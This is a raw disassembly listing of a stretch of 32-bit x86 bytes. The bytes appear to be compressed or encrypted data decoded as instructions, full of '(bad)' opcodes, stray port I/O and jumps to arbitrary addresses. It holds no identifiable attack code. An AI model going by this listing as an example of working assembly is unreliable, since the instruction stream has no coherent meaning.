  431d40:	a1 2d ba 5f 35       	mov    0x355fba2d,%eax
  431d45:	14 2e                	adc    $0x2e,%al
  431d47:	96                   	xchg   %eax,%esi
  431d48:	f0 db 3e             	lock fstpt (%esi)
  431d4b:	28 90 4d 3b 02 04    	sub    %dl,0x4023b4d(%eax)
  431d51:	de 60 b5             	fisubs -0x4b(%eax)
  431d54:	2b e8                	sub    %eax,%ebp
  431d56:	5f                   	pop    %edi
  431d57:	2a e7                	sub    %bh,%ah
  431d59:	38 42 60             	cmp    %al,0x60(%edx)
  431d5c:	e2 d5                	loop   0x431d33
  431d5e:	83 af 17 a9 3f 48 b0 	subl   $0xffffffb0,0x483fa917(%edi)
  431d65:	24 d2                	and    $0xd2,%al
  431d67:	1d 89 fa 19 45       	sbb    $0x4519fa89,%eax
  431d6c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  431d6d:	3a 9d ea a7 20 ca    	cmp    -0x35df5816(%ebp),%bl
  431d73:	7a 41                	jp     0x431db6
  431d75:	26 c6                	es (bad)
  431d77:	98                   	cwtl
  431d78:	01 28                	add    %ebp,(%eax)
  431d7a:	73 b5                	jae    0x431d31
  431d7c:	7f c4                	jg     0x431d42
  431d7e:	88 58 c5             	mov    %bl,-0x3b(%eax)
  431d81:	79 c4                	jns    0x431d47
  431d83:	1a 28                	sbb    (%eax),%ch
  431d85:	08 56 25             	or     %dl,0x25(%esi)
  431d88:	87 41 53             	xchg   %eax,0x53(%ecx)
  431d8b:	3b 85 2b 17 33 0c    	cmp    0xc33172b(%ebp),%eax
  431d91:	68 d9 9d 79 c0       	push   $0xc0799dd9
  431d96:	d8 4b 61             	fmuls  0x61(%ebx)
  431d99:	84 ec                	test   %ch,%ah
  431d9b:	a9 f2 18 4a d9       	test   $0xd94a18f2,%eax
  431da0:	e9 fe 11 04 05       	jmp    0x5472fa3
  431da5:	57                   	push   %edi
  431da6:	44                   	inc    %esp
  431da7:	47                   	inc    %edi
  431da8:	bd e1 77 f3 5c       	mov    $0x5cf377e1,%ebp
  431dad:	39 3e                	cmp    %edi,(%esi)
  431daf:	47                   	inc    %edi
  431db0:	07                   	pop    %es
  431db1:	1a 1a                	sbb    (%edx),%bl
  431db3:	3a 4e cb             	cmp    -0x35(%esi),%cl
  431db6:	27                   	daa
  431db7:	ff 4f 17             	decl   0x17(%edi)
  431dba:	22 64 2e 8d          	and    -0x73(%esi,%ebp,1),%ah
  431dbe:	cf                   	iret
  431dbf:	96                   	xchg   %eax,%esi
  431dc0:	08 23                	or     %ah,(%ebx)
  431dc2:	86 35 ad e3 b2 ff    	xchg   %dh,0xffb2e3ad
  431dc8:	7f c6                	jg     0x431d90
  431dca:	24 f2                	and    $0xf2,%al
  431dcc:	10 a9 eb 18 74 d3    	adc    %ch,-0x2c8be715(%ecx)
  431dd2:	0d 07 09 8f 77       	or     $0x778f0907,%eax
  431dd7:	9b                   	fwait
  431dd8:	68 a7 64 9e a9       	push   $0xa99e64a7
  431ddd:	ee                   	out    %al,(%dx)
  431dde:	d8 27                	fsubs  (%edi)
  431de0:	08 5c 94 60          	or     %bl,0x60(%esp,%edx,4)
  431de4:	23 98 90 de c3 d3    	and    -0x2c3c2170(%eax),%ebx
  431dea:	37                   	aaa
  431deb:	5f                   	pop    %edi
  431dec:	f5                   	cmc
  431ded:	21 e7                	and    %esp,%edi
  431def:	16                   	push   %ss
  431df0:	cc                   	int3
  431df1:	2a a1 67 b6 30 64    	sub    0x6430b667(%ecx),%ah
  431df7:	da 16                	ficoml (%esi)
  431df9:	71 d6                	jno    0x431dd1
  431dfb:	73 cf                	jae    0x431dcc
  431dfd:	20 01                	and    %al,(%ecx)
  431dff:	80 45 9e b6          	addb   $0xb6,-0x62(%ebp)
  431e03:	12 15 0a 54 68 c9    	adc    0xc968540a,%dl
  431e09:	02 3c 91             	add    (%ecx,%edx,4),%bh
  431e0c:	26 0e                	es push %cs
  431e0e:	d2 e3                	shl    %cl,%bl
  431e10:	00 12                	add    %dl,(%edx)
  431e12:	02 8c 32 cc 1e ca b4 	add    -0x4b35e134(%edx,%esi,1),%cl
  431e19:	12 36                	adc    (%esi),%dh
  431e1b:	60                   	pusha
  431e1c:	db f6                	fcomi  %st(6),%st
  431e1e:	e0 91                	loopne 0x431db1
  431e20:	0f 6b a0 93 22 9a 23 	packssdw 0x239a2293(%eax),%mm4
  431e27:	e9 ed 05 5b c8       	jmp    0xc89e2419
  431e2c:	ff 46 cf             	incl   -0x31(%esi)
  431e2f:	7e 4c                	jle    0x431e7d
  431e31:	9c                   	pushf
  431e32:	fd                   	std
  431e33:	66 4e                	dec    %si
  431e35:	cb                   	lret
  431e36:	96                   	xchg   %eax,%esi
  431e37:	72 74                	jb     0x431ead
  431e39:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  431e3a:	2d b6 4d a9 c8       	sub    $0xc8a94db6,%eax
  431e3f:	e9 8e c8 5c f3       	jmp    0xf39fe6d2
  431e44:	3a 1c f5 ea 31 24 e1 	cmp    -0x1edbce16(,%esi,8),%bl
  431e4b:	0a fe                	or     %dh,%bh
  431e4d:	e8 b5 50 84 5f       	call   0x5fc76f07
  431e52:	c0 c1 ae             	rol    $0xae,%cl
  431e55:	eb be                	jmp    0x431e15
  431e57:	59                   	pop    %ecx
  431e58:	53                   	push   %ebx
  431e59:	ff                   	(bad)
  431e5a:	fe                   	(bad)
  431e5b:	b3 9c                	mov    $0x9c,%bl
  431e5d:	b3 49                	mov    $0x49,%bl
  431e5f:	fe c5                	inc    %ch
  431e61:	98                   	cwtl
  431e62:	e8 64 9d 98 20       	call   0x20dbbbcb
  431e67:	11 6d 21             	adc    %ebp,0x21(%ebp)
  431e6a:	87 8c 7d 1f c7 f5 b4 	xchg   %ecx,-0x4b0a38e1(%ebp,%edi,2)
  431e71:	4e                   	dec    %esi
  431e72:	d9 2c f3             	fldcw  (%ebx,%esi,8)
  431e75:	40                   	inc    %eax
  431e76:	f0 23 9e 64 2d b8 34 	lock and 0x34b82d64(%esi),%ebx
  431e7d:	98                   	cwtl
  431e7e:	93                   	xchg   %eax,%ebx
  431e7f:	8d b7 cf d1 82 6e    	lea    0x6e82d1cf(%edi),%esi
  431e85:	c9                   	leave
  431e86:	11 47 b7             	adc    %eax,-0x49(%edi)
  431e89:	11 d2                	adc    %edx,%edx
  431e8b:	72 39                	jb     0x431ec6
  431e8d:	1e                   	push   %ds
  431e8e:	ef                   	out    %eax,(%dx)
  431e8f:	30 64 cf 3d          	xor    %ah,0x3d(%edi,%ecx,8)
  431e93:	9e                   	sahf
  431e94:	e8 43 f3 70 7e       	call   0x7eb411dc
  431e99:	22 f6                	and    %dh,%dh
  431e9b:	36 47                	ss inc %edi
  431e9d:	32 4d 77             	xor    0x77(%ebp),%cl
  431ea0:	13 80 18 8f 72 cd    	adc    -0x328d70e8(%eax),%eax
  431ea6:	02 0a                	add    (%edx),%cl
  431ea8:	d0 ac 43 1e 61 a3 1c 	shrb   $1,0x1ca3611e(%ebx,%eax,2)
  431eaf:	d2 4d 40             	rorb   %cl,0x40(%ebp)
  431eb2:	7b 3a                	jnp    0x431eee
  431eb4:	53                   	push   %ebx
  431eb5:	8e ce                	mov    %esi,%cs
  431eb7:	ad                   	lods   %ds:(%esi),%eax
  431eb8:	f7 cb e0 2e 6f f7    	test   $0xf76f2ee0,%ebx
  431ebe:	48                   	dec    %eax
  431ebf:	a3 b6 57 62 81       	mov    %eax,0x816257b6
  431ec4:	2d 2f 8e 9a e0       	sub    $0xe09a8e2f,%eax
  431ec9:	5c                   	pop    %esp
  431eca:	67 0e                	addr16 push %cs
  431ecc:	40                   	inc    %eax
  431ecd:	e0 ab                	loopne 0x431e7a
  431ecf:	71 4b                	jno    0x431f1c
  431ed1:	23 90 20 30 1a 93    	and    -0x6ce5cfe0(%eax),%edx
  431ed7:	4d                   	dec    %ebp
  431ed8:	05 bf ac 5f c8       	add    $0xc85facbf,%eax
  431edd:	04 74                	add    $0x74,%al
  431edf:	33 83 b8 dc 4b 74    	xor    0x744bdcb8(%ebx),%eax
  431ee5:	d2 b2 6e 10 72 19    	shlb   %cl,0x1972106e(%edx)
  431eeb:	50                   	push   %eax
  431eec:	1a 52 52             	sbb    0x52(%edx),%dl
  431eef:	fc                   	cld
  431ef0:	25 d3 92 bd 25       	and    $0x25bd92d3,%eax
  431ef5:	94                   	xchg   %eax,%esp
  431ef6:	60                   	pusha
  431ef7:	c3                   	ret
  431ef8:	0f 9f 18             	setg   (%eax)
  431efb:	06                   	push   %es
  431efc:	5d                   	pop    %ebp
  431efd:	eb 9d                	jmp    0x431e9c
  431eff:	b2 79                	mov    $0x79,%dl
  431f01:	21 39                	and    %edi,(%ecx)
  431f03:	84 d2                	test   %dl,%dl
  431f05:	dd 7d 3c             	fnstsw 0x3c(%ebp)
  431f08:	56                   	push   %esi
  431f09:	18 4c ed b3          	sbb    %cl,-0x4d(%ebp,%ebp,8)
  431f0d:	36 9f                	ss lahf
  431f0f:	b8 e2 84 0c 18       	mov    $0x180c84e2,%eax
  431f14:	77 0d                	ja     0x431f23
  431f16:	6e                   	outsb  %ds:(%esi),(%dx)
  431f17:	db 45 1f             	fildl  0x1f(%ebp)
  431f1a:	2f                   	das
  431f1b:	84 40 a9             	test   %al,-0x57(%eax)
  431f1e:	db 4d a8             	fisttpl -0x58(%ebp)
  431f21:	fd                   	std
  431f22:	d9 23                	fldenv (%ebx)
  431f24:	93                   	xchg   %eax,%ebx
  431f25:	90                   	nop
  431f26:	c4                   	(bad)
  431f27:	ef                   	out    %eax,(%dx)
  431f28:	45                   	inc    %ebp
  431f29:	53                   	push   %ebx
  431f2a:	c4                   	(bad)
  431f2b:	c0 40 b1 c1          	rolb   $0xc1,-0x4f(%eax)
  431f2f:	b2 69                	mov    $0x69,%dl
  431f31:	95                   	xchg   %eax,%ebp
  431f32:	34 c1                	xor    $0xc1,%al
  431f34:	0d fd a7 ab d3       	or     $0xd3aba7fd,%eax
  431f39:	3f                   	aas
  431f3a:	43                   	inc    %ebx
  431f3b:	21 55 54             	and    %edx,0x54(%ebp)
  431f3e:	45                   	inc    %ebp
  431f3f:	ba 3d cb 36 6c       	mov    $0x6c36cb3d,%edx
  431f44:	1d 04 9b 83 52       	sbb    $0x52839b04,%eax
  431f49:	a2 b1 ca 5e 26       	mov    %al,0x265ecab1
  431f4e:	28 da                	sub    %bl,%dl
  431f50:	d7                   	xlat   %ds:(%ebx)
  431f51:	f6 e0                	mul    %al
  431f53:	1b 4c 47 cc          	sbb    -0x34(%edi,%eax,2),%ecx
  431f57:	95                   	xchg   %eax,%ebp
  431f58:	49                   	dec    %ecx
  431f59:	22 c1                	and    %cl,%al
  431f5b:	c6 47 ae 34          	movb   $0x34,-0x52(%edi)
  431f5f:	da 67 e0             	fisubl -0x20(%edi)
  431f62:	b5 47                	mov    $0x47,%ch
  431f64:	a0 6c 37 4f cd       	mov    0xcd4f376c,%al
  431f69:	7a db                	jp     0x431f46
  431f6b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  431f6c:	c3                   	ret
  431f6d:	4d                   	dec    %ebp
  431f6e:	b2 3b                	mov    $0x3b,%dl
  431f70:	2d fe 43 dd c9       	sub    $0xc9dd43fe,%eax
  431f75:	59                   	pop    %ecx
  431f76:	5b                   	pop    %ebx
  431f77:	92                   	xchg   %eax,%edx
  431f78:	85 b2 73 3d 56 28    	test   %esi,0x28563d73(%edx)
  431f7e:	09 0b                	or     %ecx,(%ebx)
  431f80:	04 ca                	add    $0xca,%al
  431f82:	1e                   	push   %ds
  431f83:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  431f84:	91                   	xchg   %eax,%ecx
  431f85:	91                   	xchg   %eax,%ecx
  431f86:	36 74 78             	ss je  0x432001
  431f89:	19 56 4d             	sbb    %edx,0x4d(%esi)
  431f8c:	3c 2e                	cmp    $0x2e,%al
  431f8e:	73 f7                	jae    0x431f87
  431f90:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  431f91:	63 4f d9             	arpl   %ecx,-0x27(%edi)
  431f94:	6f                   	outsl  %ds:(%esi),(%dx)
  431f95:	80 fe 2c             	cmp    $0x2c,%dh
  431f98:	d0 aa 7e bc b5 fc    	shrb   $1,-0x34a4382(%edx)
  431f9e:	84 d8                	test   %bl,%al
  431fa0:	96                   	xchg   %eax,%esi
  431fa1:	da de                	fcmovu %st(6),%st
  431fa3:	8c 6b 63             	mov    %gs,0x63(%ebx)
  431fa6:	dd f3                	(bad)
  431fa8:	a1 5c b4 ba 3c       	mov    0x3cbab45c,%eax
  431fad:	16                   	push   %ss
  431fae:	e7 10                	out    %eax,$0x10
  431fb0:	e8 cf 6d 4e bb       	call   0xbb918d84
  431fb5:	ef                   	out    %eax,(%dx)
  431fb6:	f6 44 f1 2b 81       	testb  $0x81,0x2b(%ecx,%esi,8)
  431fbb:	ad                   	lods   %ds:(%esi),%eax
  431fbc:	fd                   	std
  431fbd:	59                   	pop    %ecx
  431fbe:	bc dd 9f 21 33       	mov    $0x33219fdd,%esp
  431fc3:	40                   	inc    %eax
  431fc4:	5e                   	pop    %esi
  431fc5:	7a 4d                	jp     0x432014
  431fc7:	e3 d8                	jecxz  0x431fa1
  431fc9:	a1 9f 86 a9 64       	mov    0x64a9869f,%eax
  431fce:	fc                   	cld
  431fcf:	4b                   	dec    %ebx
  431fd0:	7e bf                	jle    0x431f91
  431fd2:	d3 98 a8 ee 3a 30    	rcrl   %cl,0x303aeea8(%eax)
  431fd8:	6a e8                	push   $0xffffffe8
  431fda:	40                   	inc    %eax
  431fdb:	ca fb 57             	lret   $0x57fb
  431fde:	2d 5f 46 3f 7a       	sub    $0x7a3f465f,%eax
  431fe3:	fb                   	sti
  431fe4:	e1 80                	loope  0x431f66
  431fe6:	86 da                	xchg   %bl,%dl
  431fe8:	e4 80                	in     $0x80,%al
  431fea:	11 d0                	adc    %edx,%eax
  431fec:	e4 fe                	in     $0xfe,%al
  431fee:	60                   	pusha
  431fef:	98                   	cwtl
  431ff0:	c6                   	(bad)
  431ff1:	50                   	push   %eax
  431ff2:	93                   	xchg   %eax,%ebx
  431ff3:	47                   	inc    %edi
  431ff4:	75 67                	jne    0x43205d
  431ff6:	6d                   	insl   (%dx),%es:(%edi)
  431ff7:	05 68 98 a6 fd       	add    $0xfda69868,%eax
  431ffc:	98                   	cwtl
  431ffd:	31 e0                	xor    %esp,%eax
  431fff:	2f                   	das
  432000:	68 7e 29 c2 5e       	push   $0x5ec2297e
  432005:	6e                   	outsb  %ds:(%esi),(%dx)
  432006:	c9                   	leave
  432007:	80 ae 21 ed f5 3d d9 	subb   $0xd9,0x3df5ed21(%esi)
  43200e:	b9 ea c2 88 d2       	mov    $0xd288c2ea,%ecx
  432013:	1e                   	push   %ds
  432014:	0d 1f 08 25 00       	or     $0x25081f,%eax
  432019:	9f                   	lahf
  43201a:	c6                   	(bad)
  43201b:	af                   	scas   %es:(%edi),%eax
  43201c:	6a a7                	push   $0xffffffa7
  43201e:	91                   	xchg   %eax,%ecx
  43201f:	53                   	push   %ebx
  432020:	d5 05                	aad    $0x5
  432022:	6b cf 69             	imul   $0x69,%edi,%ecx
  432025:	f1                   	int1
  432026:	fc                   	cld
  432027:	9a a5 81 80 d7 74 1b 	lcall  $0x1b74,$0xd78081a5
  43202e:	42                   	inc    %edx
  43202f:	59                   	pop    %ecx
  432030:	c3                   	ret
  432031:	42                   	inc    %edx
  432032:	d3 f7                	shl    %cl,%edi
  432034:	eb bf                	jmp    0x431ff5
  432036:	f5                   	cmc
  432037:	7a 26                	jp     0x43205f
  432039:	c3                   	ret
  43203a:	72 1c                	jb     0x432058
  43203c:	55                   	push   %ebp
  43203d:	77 b6                	ja     0x431ff5
  43203f:	3b 3d 51 aa 7a c4    	cmp    0xc47aaa51,%edi
  432045:	5c                   	pop    %esp
  432046:	4d                   	dec    %ebp
  432047:	37                   	aaa
  432048:	d0 a8 7b 87 1a 79    	shrb   $1,0x791a877b(%eax)
  43204e:	cf                   	iret
  43204f:	cb                   	lret
  432050:	c5 3a                	lds    (%edx),%edi
  432052:	1b a4 bb 5c cf d4 fd 	sbb    -0x22b30a4(%ebx,%edi,4),%esp
  432059:	6e                   	outsb  %ds:(%esi),(%dx)
  43205a:	99                   	cltd
  43205b:	f8                   	clc
  43205c:	5b                   	pop    %ebx
  43205d:	2b 70 d8             	sub    -0x28(%eax),%esi
  432060:	82 c9 23             	or     $0x23,%cl
  432063:	e2 a5                	loop   0x43200a
  432065:	1d e9 db 6b 4d       	sbb    $0x4d6bdbe9,%eax
  43206a:	b0 13                	mov    $0x13,%al
  43206c:	33 af 67 7c e7 a7    	xor    -0x58188399(%edi),%ebp
  432072:	dc 1e                	fcompl (%esi)
  432074:	2d 2a cd fe 92       	sub    $0x92fecd2a,%eax
  432079:	34 01                	xor    $0x1,%al
  43207b:	db f0                	fcomi  %st(0),%st
  43207d:	c9                   	leave
  43207e:	16                   	push   %ss
  43207f:	15 fd c1 a6 9a       	adc    $0x9aa6c1fd,%eax
  432084:	c3                   	ret
  432085:	a8 6e                	test   $0x6e,%al
  432087:	b1 33                	mov    $0x33,%cl
  432089:	c2 a3 1e             	ret    $0x1ea3
  43208c:	05 1e 7e be 8e       	add    $0x8ebe7e1e,%eax
  432091:	37                   	aaa
  432092:	94                   	xchg   %eax,%esp
  432093:	a2 bf 43 38 5e       	mov    %al,0x5e3843bf
  432098:	12 fc                	adc    %ah,%bh
  43209a:	28 84 a3 56 61 60 66 	sub    %al,0x66606156(%ebx,%eiz,4)
  4320a1:	2d d1 2f 9b 3f       	sub    $0x3f9b2fd1,%eax
  4320a6:	38 e2                	cmp    %ah,%dl
  4320a8:	b6 f8                	mov    $0xf8,%dh
  4320aa:	1d 5b 70 fd 8a       	sbb    $0x8afd705b,%eax
  4320af:	7c 39                	jl     0x4320ea
  4320b1:	8e d0                	mov    %eax,%ss
  4320b3:	ee                   	out    %al,(%dx)
  4320b4:	b1 31                	mov    $0x31,%cl
  4320b6:	26 9e                	es sahf
  4320b8:	5c                   	pop    %esp
  4320b9:	ae                   	scas   %es:(%edi),%al
  4320ba:	00 e2                	add    %ah,%dl
  4320bc:	0d a0 4f cc c7       	or     $0xc7cc4fa0,%eax
  4320c1:	43                   	inc    %ebx
  4320c2:	54                   	push   %esp
  4320c3:	b6 c6                	mov    $0xc6,%dh
  4320c5:	16                   	push   %ss
  4320c6:	92                   	xchg   %eax,%edx
  4320c7:	4b                   	dec    %ebx
  4320c8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4320c9:	d7                   	xlat   %ds:(%ebx)
  4320ca:	80 36 cc             	xorb   $0xcc,(%esi)
  4320cd:	69 eb a3 1b bb 99    	imul   $0x99bb1ba3,%ebx,%ebp
  4320d3:	91                   	xchg   %eax,%ecx
  4320d4:	ed                   	in     (%dx),%eax
  4320d5:	da 4e af             	fimull -0x51(%esi)
  4320d8:	aa                   	stos   %al,%es:(%edi)
  4320d9:	7a fa                	jp     0x4320d5
  4320db:	4f                   	dec    %edi
  4320dc:	2e 33 5a b6          	xor    %cs:-0x4a(%edx),%ebx
  4320e0:	bb 32 5d 5b c3       	mov    $0xc35b5d32,%ebx
  4320e5:	f0 8c 27             	lock mov %fs,(%edi)
  4320e8:	2d 6b 68 e9 a0       	sub    $0xa0e9686b,%eax
  4320ed:	e2 94                	loop   0x432083
  4320ef:	bd f3 6b 86 51       	mov    $0x51866bf3,%ebp
  4320f4:	45                   	inc    %ebp
  4320f5:	b5 91                	mov    $0x91,%ch
  4320f7:	02 07                	add    (%edi),%al
  4320f9:	ee                   	out    %al,(%dx)
  4320fa:	9c                   	pushf
  4320fb:	3c ab                	cmp    $0xab,%al
  4320fd:	93                   	xchg   %eax,%ebx
  4320fe:	1d 95 22 43 d6       	sbb    $0xd6432295,%eax
  432103:	6a fd                	push   $0xfffffffd
  432105:	9a 3d fa 21 19 2a a0 	lcall  $0xa02a,$0x1921fa3d
  43210c:	eb fa                	jmp    0x432108
  43210e:	8e 74 6a 27          	mov    0x27(%edx,%ebp,2),%?
  432112:	09 e1                	or     %esp,%ecx
  432114:	d8 d2                	fcom   %st(2)
  432116:	e8 4f 20 fb 49       	call   0x4a3e416a
  43211b:	7b 5e                	jnp    0x43217b
  43211d:	b2 b2                	mov    $0xb2,%dl
  43211f:	ab                   	stos   %eax,%es:(%edi)
  432120:	d2 3b                	sarb   %cl,(%ebx)
  432122:	ec                   	in     (%dx),%al
  432123:	8f 08 9f e3          	(bad)
  432127:	c5 38                	lds    (%eax),%edi
  432129:	ee                   	out    %al,(%dx)
  43212a:	46                   	inc    %esi
  43212b:	d7                   	xlat   %ds:(%ebx)
  43212c:	b5 2f                	mov    $0x2f,%ch
  43212e:	e6 41                	out    %al,$0x41
  432130:	d6                   	salc
  432131:	91                   	xchg   %eax,%ecx
  432132:	d9 1f                	fstps  (%edi)
  432134:	ac                   	lods   %ds:(%esi),%al
  432135:	df 7b 91             	fistpll -0x6f(%ebx)
  432138:	30 2e                	xor    %ch,(%esi)
  43213a:	82 5e 49 54          	sbbb   $0x54,0x49(%esi)
  43213e:	60                   	pusha
  43213f:	c5 b8 5d 08 88 57    	lds    0x5788085d(%eax),%edi
  432145:	0e                   	push   %cs
  432146:	b3 e1                	mov    $0xe1,%bl
  432148:	e5 bd                	in     $0xbd,%eax
  43214a:	4d                   	dec    %ebp
  43214b:	c1 2c 35 1b c6 c5 19 	shrl   $0xf9,0x19c5c61b(,%esi,1)
  432152:	f9 
  432153:	cf                   	iret
  432154:	b4 f8                	mov    $0xf8,%ah
  432156:	05 a3 ea e7 6d       	add    $0x6de7eaa3,%eax
  43215b:	d2 4c 7d c0          	rorb   %cl,-0x40(%ebp,%edi,2)
  43215f:	4a                   	dec    %edx
  432160:	76 8c                	jbe    0x4320ee
  432162:	6d                   	insl   (%dx),%es:(%edi)
  432163:	da 2e                	fisubrl (%esi)
  432165:	55                   	push   %ebp
  432166:	9d                   	popf
  432167:	2c a6                	sub    $0xa6,%al
  432169:	d4 4f                	aam    $0x4f
  43216b:	ec                   	in     (%dx),%al
  43216c:	3a 77 3d             	cmp    0x3d(%edi),%dh
  43216f:	53                   	push   %ebx
  432170:	3a 96 7a a5 26 34    	cmp    0x3426a57a(%esi),%dl
  432176:	ee                   	out    %al,(%dx)
  432177:	43                   	inc    %ebx
  432178:	5c                   	pop    %esp
  432179:	f5                   	cmc
  43217a:	14 23                	adc    $0x23,%al
  43217c:	0c 3b                	or     $0x3b,%al
  43217e:	61                   	popa
  43217f:	0d cc 2c 22 e6       	or     $0xe6222ccc,%eax
  432184:	7c f3                	jl     0x432179
  432186:	b4 b6                	mov    $0xb6,%ah
  432188:	37                   	aaa
  432189:	eb 07                	jmp    0x432192
  43218b:	21 43 c7             	and    %eax,-0x39(%ebx)
  43218e:	1f                   	pop    %ds
  43218f:	8a cb                	mov    %bl,%cl
  432191:	2e 5a                	cs pop %edx
  432193:	b8 d2 18 36 aa       	mov    $0xaa3618d2,%eax
  432198:	5e                   	pop    %esi
  432199:	96                   	xchg   %eax,%esi
  43219a:	79 89                	jns    0x432125
  43219c:	4c                   	dec    %esp
  43219d:	2f                   	das
  43219e:	0b 67 4d             	or     0x4d(%edi),%esp
  4321a1:	3b a6 ed f8 70 42    	cmp    0x4270f8ed(%esi),%esp
  4321a7:	17                   	pop    %ss
  4321a8:	78 ad                	js     0x432157
  4321aa:	e1 55                	loope  0x432201
  4321ac:	73 11                	jae    0x4321bf
  4321ae:	68 75 6c 75 b5       	push   $0xb5756c75
  4321b3:	bd fe 92 8b 03       	mov    $0x38b92fe,%ebp
  4321b8:	8a a7 e8 f2 2d 0f    	mov    0xf2df2e8(%edi),%ah
  4321be:	51                   	push   %ecx
  4321bf:	50                   	push   %eax
  4321c0:	51                   	push   %ecx
  4321c1:	b2 9a                	mov    $0x9a,%dl
  4321c3:	35 7e 2d 0b 3b       	xor    $0x3b0b2d7e,%eax
  4321c8:	86 d4                	xchg   %dl,%ah
  4321ca:	bd 34 6d 07 12       	mov    $0x12076d34,%ebp
  4321cf:	c1 63 b1 71          	shll   $0x71,-0x4f(%ebx)
  4321d3:	bd fa 4c f5 3c       	mov    $0x3cf54cfa,%ebp
  4321d8:	64 6d                	fs insl (%dx),%es:(%edi)
  4321da:	b3 59                	mov    $0x59,%bl
  4321dc:	b9 21 39 54 09       	mov    $0x9543921,%ecx
  4321e1:	87 e4                	xchg   %esp,%esp
  4321e3:	15 d3 b7 72 c8       	adc    $0xc872b7d3,%eax
  4321e8:	90                   	nop
  4321e9:	63 b4 02 bc 13 70 c2 	arpl   %esi,-0x3d8fec44(%edx,%eax,1)
  4321f0:	94                   	xchg   %eax,%esp
  4321f1:	ba ce 99 05 cb       	mov    $0xcb0599ce,%edx
  4321f6:	10 18                	adc    %bl,(%eax)
  4321f8:	84 fe                	test   %bh,%dh
  4321fa:	36 d3 f9             	ss sar %cl,%ecx
  4321fd:	15 1c 3c 61 fa       	adc    $0xfa613c1c,%eax
  432202:	45                   	inc    %ebp
  432203:	62 20                	bound  %esp,(%eax)
  432205:	d6                   	salc
  432206:	01 57 7e             	add    %edx,0x7e(%edi)
  432209:	23 00                	and    (%eax),%eax
  43220b:	fa                   	cli
  43220c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  43220d:	35 2d db b1 a2       	xor    $0xa2b1db2d,%eax
  432212:	d6                   	salc
  432213:	8b 61 58             	mov    0x58(%ecx),%esp
  432216:	10 2c 19             	adc    %ch,(%ecx,%ebx,1)
  432219:	26 34 b4             	es xor $0xb4,%al
  43221c:	2c 57                	sub    $0x57,%al
  43221e:	e2 7f                	loop   0x43229f
  432220:	f3 e7 05             	repz out %eax,$0x5
  432223:	04 9c                	add    $0x9c,%al
  432225:	57                   	push   %edi
  432226:	27                   	daa
  432227:	63 89 a6 da fa 74    	arpl   %ecx,0x74fadaa6(%ecx)
  43222d:	8d 84 d2 cd fa 5c 83 	lea    -0x7ca30533(%edx,%edx,8),%eax
  432234:	50                   	push   %eax
  432235:	07                   	pop    %es
  432236:	50                   	push   %eax
  432237:	34 4c                	xor    $0x4c,%al
  432239:	26 10 b1 3c d0 a9 ec 	adc    %dh,%es:-0x13562fc4(%ecx)
  432240:	48                   	dec    %eax
  432241:	9d                   	popf
  432242:	33 f5                	xor    %ebp,%esi
  432244:	a9 76 83 8b 69       	test   $0x698b8376,%eax
  432249:	58                   	pop    %eax
  43224a:	6e                   	outsb  %ds:(%esi),(%dx)
  43224b:	28 ee                	sub    %ch,%dh
  43224d:	20 c4                	and    %al,%ah
  43224f:	75 7d                	jne    0x4322ce
  432251:	6b b5 3a 6d 63 b7 fb 	imul   $0xfffffffb,-0x489c92c6(%ebp),%esi
  432258:	c1 9b 14 dc e9 80 6d 	rcrl   $0x6d,-0x7f1623ec(%ebx)
  43225f:	42                   	inc    %edx
  432260:	90                   	nop
  432261:	2f                   	das
  432262:	cd fa                	int    $0xfa
  432264:	c0 2f d8             	shrb   $0xd8,(%edi)
  432267:	53                   	push   %ebx
  432268:	57                   	push   %edi
  432269:	73 b2                	jae    0x43221d
  43226b:	0c bb                	or     $0xbb,%al
  43226d:	e7 65                	out    %eax,$0x65
  43226f:	17                   	pop    %ss
  432270:	2d 0a 9a 3c de       	sub    $0xde3c9a0a,%eax
  432275:	0e                   	push   %cs
  432276:	fa                   	cli
  432277:	87 31                	xchg   %esi,(%ecx)
  432279:	95                   	xchg   %eax,%ebp
  43227a:	ee                   	out    %al,(%dx)
  43227b:	33 75 e2             	xor    -0x1e(%ebp),%esi
  43227e:	fa                   	cli
  43227f:	32 c5                	xor    %ch,%al
  432281:	24 eb                	and    $0xeb,%al
  432283:	6e                   	outsb  %ds:(%esi),(%dx)
  432284:	5f                   	pop    %edi
  432285:	23 19                	and    (%ecx),%ebx
  432287:	d2 d6                	rcl    %cl,%dh
  432289:	2d db 28 36 ac       	sub    $0xac3628db,%eax
  43228e:	23 b2 bc e0 cc e0    	and    -0x1f331f44(%edx),%esi
  432294:	ce                   	into
  432295:	20 da                	and    %bl,%dl
  432297:	6a 1c                	push   $0x1c
  432299:	1d c4 26 ef 1a       	sbb    $0x1aef26c4,%eax
  43229e:	17                   	pop    %ss
  43229f:	13 60 b1             	adc    -0x4f(%eax),%esp
  4322a2:	5b                   	pop    %ebx
  4322a3:	01 d5                	add    %edx,%ebp
  4322a5:	ef                   	out    %eax,(%dx)
  4322a6:	4b                   	dec    %ebx
  4322a7:	73 1d                	jae    0x4322c6
  4322a9:	ea dd 0a 2b 7c 3e d4 	ljmp   $0xd43e,$0x7c2b0add
  4322b0:	81 61 f5 93 65 38 b8 	andl   $0xb8386593,-0xb(%ecx)
  4322b7:	e7 6c                	out    %eax,$0x6c
  4322b9:	0d e0 ac 21 92       	or     $0x9221ace0,%eax
  4322be:	69 eb 15 4d af 1e    	imul   $0x1eaf4d15,%ebx,%ebp
  4322c4:	fe 46 40             	incb   0x40(%esi)
  4322c7:	37                   	aaa
  4322c8:	2c 18                	sub    $0x18,%al
  4322ca:	f4                   	hlt
  4322cb:	5e                   	pop    %esi
  4322cc:	3d c4 bf e0 bd       	cmp    $0xbde0bfc4,%eax
  4322d1:	e9 0b f8 35 1b       	jmp    0x1b791ae1
  4322d6:	e7 9b                	out    %eax,$0x9b
  4322d8:	cf                   	iret
  4322d9:	82 11 f9             	adcb   $0xf9,(%ecx)
  4322dc:	99                   	cltd
  4322dd:	bd 9a 1a 77 1b       	mov    $0x1b771a9a,%ebp
  4322e2:	ac                   	lods   %ds:(%esi),%al
  4322e3:	1a d1                	sbb    %cl,%dl
  4322e5:	95                   	xchg   %eax,%ebp
  4322e6:	d2 cf                	ror    %cl,%bh
